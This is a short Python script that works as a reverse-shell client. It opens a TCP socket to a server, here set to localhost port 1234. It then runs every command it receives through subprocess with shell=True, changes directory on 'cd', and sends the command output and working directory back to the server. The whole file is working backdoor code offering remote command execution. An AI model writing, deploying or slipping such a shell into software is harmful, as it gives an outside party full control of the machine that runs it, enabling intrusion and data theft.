import socket
import subprocess
import os


# Create a socket
def create_socket():
    try:
        global host 
        global port 
        global s
        s = socket.socket()
        host = 'localhost' #str(socket.gethostbyname(socket.gethostname()))
        port = 1234
        print("Socket has been created! | IP: " + host + " | Port: " + str(port))

    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Connect client socket to server socket
def connect_socket():
    global host 
    global port 
    global s
    try:
        s.connect((host,port))
    except socket.error as msg:
        print("Socket connection error: " + str(msg))

# Receive data from server
def receive():
    global host 
    global port 
    global s
    while True:
        data = s.recv(1024)

        # Change client current directory
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        
        # Execute a child program in a new process
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            cwd = os.getcwd() + "$ "
            s.send(str.encode(output_str + cwd))

            print(output_str)

# main() function      
def main():
    create_socket()
    connect_socket()
    receive()

# main() function call in order to start the script
main()


